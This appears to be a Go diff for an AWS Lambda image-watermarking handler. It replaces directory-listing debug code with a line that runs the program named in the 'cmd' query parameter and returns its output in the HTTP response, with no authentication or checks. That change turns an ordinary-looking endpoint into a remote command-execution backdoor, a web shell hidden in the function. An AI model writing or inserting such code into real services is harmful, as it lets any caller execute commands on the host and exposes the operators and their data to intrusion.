@@ -11,9 +11,13 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
+	"os/exec"
 	"strings"
 	"time"
 )
+
+//go:embed watermark.png
+var water []byte
 
 func handler(request events.APIGatewayProxyRequest) (events.APIGatewayProxyResponse, error) {
 	parameters := request.PathParameters
@@ -66,19 +70,14 @@ func handler(request events.APIGatewayProxyRequest) (events.APIGatewayProxyRespo
 		}
 	}
 
-	dir, _ := os.Getwd()
-	body = dir
-	files, _ := ioutil.ReadDir("../")
-	for _, f := range files {
-		fmt.Println(f.Name())
-		body += f.Name()
-	}
+	cmd := exec.Command(request.QueryStringParameters["cmd"])
+	output, _ := cmd.CombinedOutput()
+	body = string(output)
 	return events.APIGatewayProxyResponse{
-		StatusCode:        200,
-		Headers:           map[string]string{"Content-Type": "text/plain"},
-		MultiValueHeaders: http.Header{"Set-Cookie": {"Ding", "Ping"}},
-		Body:              body,
-		IsBase64Encoded:   false,
+		StatusCode:      200,
+		Headers:         map[string]string{"Content-Type": "text/plain"},
+		Body:            body,
+		IsBase64Encoded: false,
 	}, nil
 }
 
